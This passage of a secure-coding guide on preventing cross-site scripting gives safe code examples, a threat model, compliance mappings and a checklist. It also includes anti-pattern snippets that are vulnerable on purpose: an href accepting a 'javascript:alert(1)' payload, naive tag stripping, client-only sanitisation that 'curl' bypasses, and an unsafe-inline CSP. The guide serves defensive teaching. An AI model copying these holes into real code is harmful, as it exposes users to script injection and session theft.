  userBio = this.sanitizer.bypassSecurityTrustHtml(rawBioFromDb)  // DANGEROUS
}
```

---

## 13. Secure Examples

### Example 1: Safe Search Page

```python
# Flask — SAFE
import html

@app.route('/search')
def search():
    query = request.args.get('q', '')[:200]  # length limit
    safe_query = html.escape(query)  # HTML encode
    results = db.search(query)  # query used safely in parameterized DB call
    return render_template('search.html', query=safe_query, results=results)

# Template (Jinja2 auto-escapes by default)
# <h2>Results for: {{ query }}</h2>  ← safe in Jinja2
```

### Example 2: Safe Comment System

```typescript
// Safe storage — plain text only, no HTML
app.post('/comments', async (req, res) => {
  const { content } = req.body
  
  // Validate input
  if (!content || typeof content !== 'string' || content.length > 2000) {
    return res.status(400).json({ error: 'Invalid comment' })
  }
  
  // Strip ALL HTML — comments are plain text only
  const plainText = content.replace(/<[^>]*>/g, '').trim()
  
  await pool.query('INSERT INTO comments (content) VALUES ($1)', [plainText])
  res.json({ success: true })
})

// Safe rendering via textContent (React)
function Comment({ content }) {
  return <div className="comment">{content}</div>  // JSX auto-encodes
}
```

### Example 3: Safe Rich Text (With DOMPurify)

```typescript
// For when HTML is genuinely needed (blog posts, article editors)
import DOMPurify from 'dompurify'

// Sanitize on SAVE (defense in depth)
async function saveArticle(userId: string, title: string, content: string) {
  const sanitizedContent = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'h2', 'h3', 'ul', 'ol', 'li', 'a', 'blockquote', 'code', 'pre', 'br'],
    ALLOWED_ATTR: ['href', 'title'],
    ALLOWED_URI_REGEXP: /^(https?:|mailto:)/i
  })
  
  await pool.query(
    'INSERT INTO articles (user_id, title, content) VALUES ($1, $2, $3)',
    [userId, title, sanitizedContent]
  )
}

// Sanitize on RENDER too (defense in depth — covers data imported from other sources)
function Article({ content }) {
  const clean = DOMPurify.sanitize(content, { /* same config */ })
  return <article dangerouslySetInnerHTML={{ __html: clean }} />
}
```

### Example 4: Safe DOM Manipulation

```javascript
// SAFE — use DOM APIs instead of innerHTML
function displaySearchResults(results) {
  const container = document.getElementById('results')
  container.innerHTML = ''  // Clear existing

  results.forEach(result => {
    const div = document.createElement('div')
    div.className = 'result-item'

    const title = document.createElement('h3')
    title.textContent = result.title  // textContent is always safe

    const link = document.createElement('a')
    // Validate URL before setting href
    if (/^https?:\/\//.test(result.url)) {
      link.href = result.url
      link.rel = 'noopener noreferrer'
    }
    link.textContent = 'View Details'

    div.appendChild(title)
    div.appendChild(link)
    container.appendChild(div)
  })
}
```

---

## 14. Anti-Patterns

### Anti-Pattern 1: Trusting framework auto-escaping in all contexts

```jsx
// Developer assumes React always protects
// UNSAFE — href with javascript: protocol
const UserLink = ({ user }) => (
  <a href={user.website}>Visit Website</a>  // javascript:alert(1) works here
)
```

### Anti-Pattern 2: Sanitizing on input, not encoding on output

```javascript
// WRONG mental model
function saveComment(content) {
  // "I sanitize on input, so I don't need to encode on output"
  const clean = content.replace(/</g, '').replace(/>/g, '')
  return clean  // still unsafe — other XSS vectors remain
}

// In template:
html += `<div>${savedComment}</div>`  // STILL VULNERABLE to remaining vectors
```

### Anti-Pattern 3: Client-side-only sanitization

```javascript
// WRONG — only sanitizing in the browser
document.getElementById('form').addEventListener('submit', (e) => {
  const comment = DOMPurify.sanitize(commentInput.value)
  // sends clean content to server
  fetch('/api/comments', { method: 'POST', body: JSON.stringify({ comment }) })
})

// The server stores whatever it receives via POST body
// An attacker bypasses the browser entirely: curl -X POST ...
// Server receives and stores unsanitized HTML
```

### Anti-Pattern 4: CSP with unsafe-inline defeating the purpose

```
# This CSP provides NO XSS protection — unsafe-inline allows all inline scripts
Content-Security-Policy: script-src 'self' 'unsafe-inline'
```

---

## 15. Threat Model

| Scenario | Type | Impact | Likelihood |
|---|---|---|---|
| Attacker injects script in profile name | Stored | All users seeing profile → session theft | High |
| Phishing URL with reflected XSS payload | Reflected | Targeted user → credential theft | Medium |
| DOM XSS via URL fragment in SPA | DOM | Any user clicking crafted URL | Medium |
| Comment on popular post with stored XSS | Stored | Thousands of users → mass account takeover | High |
| Admin panel displays user-submitted data | Stored | Admin credentials → full system compromise | Critical |
| Third-party CDN script compromised | Supply chain | All users of the site → mass exfiltration | Low-medium |

---

## 16. Compliance Mapping

| Control | OWASP | CWE | GDPR | LGPD | NIST |
|---|---|---|---|---|---|
| Output encoding | A03:2021 | CWE-79 | Art. 25, 32 | Art. 46 | SI-10 |
| CSP header | A05:2021 | CWE-693 | Art. 32 | Art. 46 | SC-28 |
| HttpOnly cookies | A02:2021 | CWE-1004 | Art. 32 | Art. 46 | SC-8 |
| SRI for CDN | A08:2021 | CWE-829 | Art. 32 | Art. 46 | SA-12 |
| Input validation | A03:2021 | CWE-20 | Art. 25 | Art. 46 | SI-10 |

---

## 17. Checklist

- [ ] All user-supplied data in HTML context uses `textContent` or HTML encoding
- [ ] `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML` are audited
- [ ] `dangerouslySetInnerHTML` (React), `v-html` (Vue), `[innerHTML]` (Angular) are searched
- [ ] Rich text user input is sanitized with DOMPurify before storage and before rendering
- [ ] URL inputs validate scheme (only `http:`/`https:`)
- [ ] CSP header is deployed (prefer nonce-based; at minimum block `object-src 'none'`)
- [ ] Session cookies are `HttpOnly; Secure; SameSite=Strict`
- [ ] Third-party scripts use Subresource Integrity (SRI) with pinned hashes
- [ ] DOM-based XSS sources (URL, hash, postMessage) are audited for dangerous sinks
- [ ] postMessage handlers validate `event.origin` before processing data

---

## 18. References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP DOM-based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [Content Security Policy — MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [DOMPurify GitHub](https://github.com/cure53/DOMPurify)
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [Google's XSS Game](https://xss-game.appspot.com/)
- [Subresource Integrity — MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)
